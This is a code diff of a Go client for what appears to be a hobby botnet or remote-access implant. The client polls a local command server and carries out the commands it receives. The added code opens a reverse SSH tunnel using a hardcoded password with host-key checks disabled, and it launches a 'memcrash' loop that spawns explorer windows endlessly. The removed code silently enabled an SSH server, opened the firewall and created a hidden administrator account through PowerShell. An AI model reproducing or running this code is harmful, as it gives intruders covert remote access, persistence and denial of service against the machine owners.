@@ -1,14 +1,13 @@
-// client.go
 package main
 
 import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net/http"
-	"net/url"
 	"os/exec"
-	"strings"
+	"os/user"
 )
 
 type PingResponse struct {
@@ -18,96 +17,66 @@ type PingResponse struct {
 }
 
 func main() {
-	deviceName := "kit kat"
-	pingURL := fmt.Sprintf("http://127.0.0.1:8000/ping/%s", url.PathEscape(deviceName))
-
-	resp, err := http.Get(pingURL)
+	// Get current user's username
+	currentUser, err := user.Current()
 	if err != nil {
-		fmt.Println("Error pinging server:", err)
-		return
+		log.Fatalf("Failed to get current user: %v", err)
+	}
+	deviceName := currentUser.Username
+
+	url := fmt.Sprintf("http://127.0.0.1:8000/ping/%s", deviceName)
+
+	resp, err := http.Get(url)
+	if err != nil {
+		log.Fatalf("Failed to ping server: %v", err)
 	}
 	defer resp.Body.Close()
 
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		fmt.Println("Read error:", err)
-		return
+		log.Fatalf("Failed to read response: %v", err)
 	}
 
 	var pingResp PingResponse
 	if err := json.Unmarshal(body, &pingResp); err != nil {
-		fmt.Println("JSON parse error:", err)
-		return
+		log.Fatalf("Failed to parse JSON: %v", err)
 	}
 
-	fmt.Printf("Got ID: %s, Command: %s\n", pingResp.ID, pingResp.Command)
+	fmt.Println("Ping Response:")
+	fmt.Printf("Status: %s\nCommand: %s\nID: %s\n", pingResp.Status, pingResp.Command, pingResp.ID)
 
-	if pingResp.Command == "ssh" {
-		runPowerShellCommands(pingResp.ID)
+	if pingResp.Command == "reverseSSH" {
+		fmt.Println("Got command", pingResp.Command)
 
-		publicIP, err := getPublicIP()
+		cmd := exec.Command("sshpass", "-p", "Kimi2020",
+			"ssh", "-o", "StrictHostKeyChecking=no",
+			"-N", "-R", "2222:localhost:22", "botsolo@127.0.0.1")
+
+		cmd.Stdout = nil
+		cmd.Stderr = nil
+
+		err := cmd.Start()
 		if err != nil {
-			fmt.Println("Failed to get public IP:", err)
-			return
+			log.Fatalf("Failed to start SSH: %v", err)
+		} else {
+			fmt.Println("[+] SSH tunnel started successfully")
 		}
+	}
 
-		sshConnectString := fmt.Sprintf("ssh %s@%s", pingResp.ID, publicIP)
-		fmt.Println("Sending SSH connect string:", sshConnectString)
+	if pingResp.Command == "memcrash" {
+		fmt.Println("Got command", pingResp.Command)
 
-		if err := sendSSHReceived(deviceName, sshConnectString); err != nil {
-			fmt.Println("Error sending SSH received confirmation:", err)
+		// This infinite loop spams explorer windows endlessly
+		cmd := exec.Command("cmd.exe", "/c", `for /l %i in (0,0,1) do start explorer`)
+
+		cmd.Stdout = nil
+		cmd.Stderr = nil
+
+		err := cmd.Start()
+		if err != nil {
+			log.Fatalf("Failed to exec memcrash %v", err)
+		} else {
+			fmt.Println("pray.gif")
 		}
-	} else {
-		fmt.Println("Command is not ssh — skipping PowerShell execution.")
 	}
-}
-
-func runPowerShellCommands(cowid string) {
-	script := fmt.Sprintf(`
-		Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;
-		Start-Service sshd;
-		Set-Service -Name sshd -StartupType 'Automatic';
-		New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Protocol TCP -LocalPort 22 -Action Allow;
-		net user %s /add;
-		Add-LocalGroupMember -Group "Administrators" -Member "%s";
-	`, cowid, cowid)
-
-	cmd := exec.Command("powershell", "-Command", script)
-	out, err := cmd.CombinedOutput()
-	if err != nil {
-		fmt.Printf("Failed PowerShell exec: %v\nOutput: %s\n", err, string(out))
-		return
-	}
-
-	fmt.Println("PowerShell commands executed successfully!")
-}
-
-func sendSSHReceived(deviceName, sshConnect string) error {
-	notifyURL := fmt.Sprintf("http://127.0.0.1:8000/ping/ssh/%s/%s",
-		url.PathEscape(deviceName), url.PathEscape(sshConnect))
-
-	resp, err := http.Get(notifyURL)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	body, _ := ioutil.ReadAll(resp.Body)
-	fmt.Println("Server response to SSH received:", string(body))
-	return nil
-}
-
-func getPublicIP() (string, error) {
-	resp, err := http.Get("https://api.ipify.org")
-	if err != nil {
-		return "", err
-	}
-	defer resp.Body.Close()
-
-	ipBytes, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return "", err
-	}
-
-	return strings.TrimSpace(string(ipBytes)), nil
 }
